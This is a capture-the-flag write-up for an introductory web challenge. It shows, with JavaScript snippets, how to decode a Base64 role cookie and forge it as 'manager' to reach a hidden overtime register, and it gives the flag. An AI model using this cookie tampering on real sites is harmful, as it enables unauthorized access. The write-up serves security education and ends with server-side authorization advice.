# Pointeuse Fantôme

**Category:** Web  
**Difficulty:** Intro  
**Points:** 50  
**Status:** Solved

## Challenge Description

Tricatel's new time-tracking software quietly removes overtime hours from employee records. An employee can only view their own timesheet, while a manager can consult the actual overtime register.

## Initial Reconnaissance

The application showed:

- Employee ID: `8472`
- Role: `employe`
- Declared overtime: `0 h`
- A notice stated that only a manager could view the actual register.

## Cookie Inspection

Using the browser DevTools Console:

```javascript
document.cookie
```

The page used a cookie named `profil`. Its value was URL-encoded Base64 data. Decoding it revealed:

```json
{
  "employe": "Vous (#8472)",
  "role": "employe"
}
```

## Exploitation

The role value was changed to `manager` in the cookie:

```javascript
const profile = {
  employe: "Vous (#8472)",
  role: "manager"
};

document.cookie =
  "profil=" + encodeURIComponent(btoa(JSON.stringify(profile))) + "; path=/";
```

After refreshing the page:

```javascript
location.reload();
```

the application displayed the manager view.

## Results

The actual overtime register showed:

| Employee | Overtime declared | Actual overtime |
|---|---:|---:|
| Marc V. (senior dev) | 0 h | 58 h |
| HR Intern | 0 h | 31 h |
| You (#8472) | 0 h | 44 h |

## Flag

```text
CyberZerk{P0int3us3_Qu1_0ubl13_L3s_H3ur3s_Sup}
```

## Key Takeaway

The application trusted a role value supplied in a client-side cookie that could be modified by the user. Authorization decisions should be enforced server-side using a trusted, integrity-protected session and server-side role checks.

**Vulnerability:** Broken Access Control  
**Technique:** Client-side cookie manipulation and Base64 decoding  
**Impact:** Unauthorized access to the manager-only overtime register.
